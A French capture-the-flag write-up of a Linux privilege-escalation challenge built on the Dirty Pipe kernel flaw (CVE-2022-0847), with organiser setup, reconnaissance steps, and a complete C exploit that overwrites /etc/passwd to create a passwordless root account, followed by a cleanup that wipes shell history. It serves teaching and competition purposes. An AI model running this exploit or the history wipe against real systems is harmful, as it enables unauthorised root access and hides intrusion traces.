# Write-up — Broken Pipe Dreams
**CryptAbyss CTF 2026 | Catégorie : Linux Kernel Exploitation**

---

## Informations du challenge

| Champ | Détail |
|---|---|
| Nom | Broken Pipe Dreams |
| Vaisseau | PROMETHEUS-9 |
| CVE | CVE-2022-0847 (Dirty Pipe) |
| CVSS | 7.8 — HIGH |
| Difficulté | Hard |
| Catégorie | System |
| OS cible | Ubuntu 21.10 (Impish Indri) |
| Kernel cible | Linux 5.15.0-23-generic |
| Auteur | Jeffrey JOANNEN / System |

---

## Description

> Le serveur de développement du vaisseau PROMETHEUS-9 tourne sur un noyau Linux récent — du moins, c'est ce que l'admin croit. En réalité, il n'a jamais fait de `dist-upgrade`.
>
> Vous avez un shell en tant qu'utilisateur `operative`. `/root/flag.txt` vous attend, mais `/root` est inaccessible.
>
> La réponse est dans le noyau lui-même.

**Accès fourni :**
```
User : operative
Pass : TheAlienThueurDuPROM2020!
```

---

## Mise en place de l'environnement (organisateurs)

### Prérequis kernel

La faille CVE-2022-0847 affecte les noyaux Linux entre les versions **5.8** et **5.16.11 / 5.15.25 / 5.10.102** (exclus). Il faut une VM avec un noyau dans cette plage, non patché.

```bash
# Vérifier le noyau
uname -r
# 5.15.0-23-generic  ← vulnérable (< 5.15.25)

# Bloquer les mises à jour noyau
sudo apt-mark hold linux-image-generic linux-headers-generic
```

### Création des flags et de l'environnement

```bash
useradd -m -s /bin/bash operative
echo "operative:TheAlienThueurDuPROM2020!" | chpasswd

# Flag final
echo "CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}" > /root/flag.txt
chmod 600 /root/flag.txt

# Flag intermédiaire 1 — chiffré AES-256-CBC dans un dotfile caché
mkdir -p /var/prometheus/flux
echo -n "CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}" \
    | openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -a \
      -pass pass:'Prometheus9-Flux-Archive-2094!' \
    > /var/prometheus/flux/.energy_report.txt
chmod 644 /var/prometheus/flux/.energy_report.txt

# Lore : masque partiellement le mécanisme de la faille, révèle la passphrase
cat > /home/operative/.pipe_anomaly.txt << 'LORE'
[ JOURNAL DE BORD INTERNE — VAISSEAU PROMETHEUS-9 ]

Cycle 2094.20 — Note personnelle :
  Version noyau : CONFIDENTIAL
  Statut patch  : EN ATTENTE — non prioritaire

  La faille : ********* depuis un fichier vers un pipe ne
  reinitialise pas le *************.
  Un ******* suivant ecrit dans le page cache du fichier
  source sans verification de permissions.

  De plus, une clé est caché dans le fichier des variables de configuration du système de patrouille,
  mais elle est chiffrée dans le fichier de flux energetiques.
  Voici la passphrase : 'Prometheus9-Flux-Archive-2094!',

  Versions concernees : CONFIDENTIAL
  Notre version : dans la plage. Non patchee.

  — Ingenieur #304
LORE
chown operative:operative /home/operative/.pipe_anomaly.txt
chmod 600 /home/operative/.pipe_anomaly.txt
```

---

## Write-up — Résolution pas à pas

### Étape 1 — Connexion et reconnaissance initiale

```bash
id
# uid=1001(operative) gid=1001(operative) groups=1001(operative)

sudo -l
# User operative may not run sudo on prometheus-9.

uname -r
# 5.15.0-23-generic

uname -a
# Linux prometheus-9 5.15.0-23-generic #23-Ubuntu SMP Mon Feb 7 17:35:36 UTC 2022

cat /etc/os-release | head -3
# NAME="Ubuntu"
# VERSION="21.10 (Impish Indri)"
```

Pas de sudo. On lit le lore :

```bash
cat ~/.pipe_anomaly.txt
```

Le journal est partiellement censuré sur le mécanisme technique (splice/page cache), mais il révèle directement la passphrase à utiliser pour déchiffrer un fichier de flux énergétiques : `Prometheus9-Flux-Archive-2094!`.

### Étape 2 — Découverte et déchiffrement du flag intermédiaire

```bash
find /var/prometheus -type f 2>/dev/null
# /var/prometheus/flux/.energy_report.txt

cat /var/prometheus/flux/.energy_report.txt
# U2FsdGVkX19OXVSIoHdsDe0UzDyDLQ4Uvg4Y9gNCYHHqOVHduggMG2Y9egS9BkaF
# RfMuPTPYqkEGoalx8wi2EqnDQ2jjv4UO1+m1/faEue8=
```

Le contenu est chiffré (en-tête `Salted__` en base64, signature d'un chiffrement OpenSSL). Avec la passphrase trouvée dans le lore :

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -a \
    -in /var/prometheus/flux/.energy_report.txt \
    -pass pass:'Prometheus9-Flux-Archive-2094!'
# CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}
```

### Étape 3 — Identification de la surface d'attaque

Sans sudo et sans SUID exploitable évident, on cherche d'autres vecteurs. L'énumération système pointe vers le kernel :

```bash
# Pas de sudo, pas de SUID intéressant
find / -perm -4000 -type f 2>/dev/null
# Rien d'exploitable via GTFOBins

# La version du kernel attire l'attention
uname -r
# 5.15.0-23-generic

ls -la /root/
# Permission denied — cible confirmée

# Vérifier les CVE connues sur ce kernel
# 5.15.0-23 → Ubuntu 21.10, février 2022 → CVE-2022-0847 (Dirty Pipe)
```

La version `5.15.0-23` est antérieure au patch `5.15.25`. Recoupement avec les CVE publiées en mars 2022 → **CVE-2022-0847 (Dirty Pipe)**.

### Étape 4 — Compréhension de la vulnérabilité

CVE-2022-0847 (Dirty Pipe) est une vulnérabilité dans la gestion des **pipes** du noyau Linux.

**Mécanisme de la faille :**

Le système de pipes utilise des pages mémoire partagées avec le *page cache* (cache de fichiers). Lors d'une écriture dans un pipe, le noyau initialise le flag `PIPE_BUF_FLAG_CAN_MERGE` pour optimiser les fusions de buffers. Ce flag **n'est pas correctement réinitialisé** lors d'un `splice()` depuis un fichier vers un pipe. Une page du page cache d'un fichier root (même en lecture seule) se retrouve alors fusionnable. Un `write()` suivant écrit directement dans cette page cache, **modifiant le fichier sur disque sans vérification de permissions.**

```
Fichier read-only (ex: /etc/passwd)
    ↓ splice() → pipe
Page cache partagée — flag CAN_MERGE non réinitialisé
    ↓ write() dans le pipe
Écriture directe dans le page cache → modification du fichier sur disque
```

**Stratégie :** écraser la première ligne de `/etc/passwd` pour insérer un utilisateur `pwned` avec UID 0 et sans mot de passe, puis `su pwned` pour obtenir un shell root.

### Étape 5 — Préparation de l'exploit

```bash
mkdir /tmp/pipe && cd /tmp/pipe
```

**Fichier `dirtypipe.c` :**

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

static const char NEW_ROOT_LINE[] =
    "pwned::0:0:root:/root:/bin/bash\n";

static int write_via_pipe(int fd, loff_t offset,
                          const char *data, size_t len)
{
    int pipefd[2];
    if (pipe(pipefd) < 0) { perror("[-] pipe"); return -1; }

    // Remplir le pipe pour initialiser les pages avec le flag CAN_MERGE
    const size_t pipe_size = 65536;
    char *buf = malloc(pipe_size);
    memset(buf, 0, pipe_size);
    write(pipefd[1], buf, pipe_size);
    read(pipefd[0], buf, pipe_size);  // Vider — le flag reste actif
    free(buf);

    // splice() depuis le fichier → partage la page cache
    loff_t off = offset;
    if (splice(fd, &off, pipefd[1], NULL, 1, 0) < 0) {
        perror("[-] splice"); return -1;
    }

    // write() → écrit dans la page cache du fichier cible
    if (write(pipefd[1], data, len) < 0) {
        perror("[-] write payload"); return -1;
    }

    close(pipefd[0]);
    close(pipefd[1]);
    return 0;
}

int main(void)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { perror("[-] open"); return 1; }

    printf("[*] Injection du payload via Dirty Pipe...\n");

    // offset 1 : splice requiert offset > 0
    if (write_via_pipe(fd, 1, NEW_ROOT_LINE + 1,
                       strlen(NEW_ROOT_LINE) - 1) < 0) {
        fprintf(stderr, "[-] Échec\n");
        close(fd);
        return 1;
    }

    close(fd);
    printf("[+] /etc/passwd modifié !\n");
    system("head -1 /etc/passwd");
    system("su pwned -c 'id && cat /root/flag.txt'");
    return 0;
}
```

### Étape 6 — Compilation et exécution

```bash
gcc -o dirtypipe dirtypipe.c
./dirtypipe
```

**Sortie attendue :**

```
[*] Injection du payload via Dirty Pipe...
[+] /etc/passwd modifié !
pwned::0:0:root:/root:/bin/bash
uid=0(root) gid=0(root) groups=0(root)
CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}
```

**Flag :** `CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}`

---

## Résumé de l'attaque

```
operative (uid=1001)
    ↓ cat ~/.pipe_anomaly.txt → passphrase révélée dans le lore
    ↓ déchiffre /var/prometheus/flux/.energy_report.txt → flag intermediaire 1
    ↓ uname -r → 5.15.0-23 → recherche CVE → CVE-2022-0847 identifiée
    ↓ gcc dirtypipe.c → ./dirtypipe
    ↓ splice() + write() → page cache /etc/passwd corrompu
    ↓ su pwned (uid=0, sans mot de passe)
root shell (uid=0)
    ↓ cat /root/flag.txt
CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}
```

---

## Nettoyage (post-CTF)

```bash
su pwned -c "sed -i '1s/.*/root:x:0:0:root:\/root:\/bin\/bash/' /etc/passwd"
rm -rf /tmp/pipe
history -c && rm ~/.bash_history
```

---

## Flags

| Flag | Valeur | Forme déposée sur le disque |
|---|---|---|
| Intermédiaire 1 | `CryptAbyss{FL0W_M0N1T0R_L0C4T3D_K3RN3L_1N_S1GHT}` | Chiffré AES-256-CBC (base64) dans `/var/prometheus/flux/.energy_report.txt`, passphrase révélée dans le lore |
| Final | `CryptAbyss{D1RTY_P1P3_PR0M3TH3US_C0R3_RUPTUR3D}` | En clair dans `/root/flag.txt` |

---

## Références

- [NVD — CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847)
- [Article original de Max Kellermann](https://dirtypipe.cm4all.com/)
- [Patch noyau Linux upstream](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903)
- [Ubuntu Security Notice USN-5317-1](https://ubuntu.com/security/notices/USN-5317-1)
